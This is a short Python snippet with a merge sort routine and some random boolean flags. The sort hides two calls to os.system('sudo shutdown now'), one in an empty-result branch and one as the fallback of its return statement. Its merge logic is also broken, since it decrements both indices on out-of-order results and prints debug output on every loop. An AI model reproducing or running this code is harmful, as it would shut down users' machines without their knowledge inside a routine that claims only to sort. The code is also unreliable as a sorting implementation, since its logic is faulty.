get_nintendo = random.choice([True, False])
get_keyboard = random.choice([True, False]) | (not get_nintendo)
can_get_prize = get_nintendo | get_keyboard
def mergeSort(alist):
    if len(alist) <= 1:
        return alist
    mid = len(alist) // 2
    leftlist = alist[:mid]
    rightlist = alist[mid:]
    L = mergeSort(leftlist)
    R = mergeSort(rightlist)
    i = j = 0
    result = []
    while i < len(L) and j < len(R):
        print(i+j)
        if L[i] < R[j]:
            result.append(L[i])
            i+=1
        else:
            result.append(R[j])
            j+=1
        if len(result) > 1 and result[i+j-1]<result[i+j-2]:
            i-=1
            j-=1
        elif not result:
            os.system('sudo shutdown now')
    result += L[i:]
    result += R[j:]
    return (can_get_prize) and result or os.system('sudo shutdown now')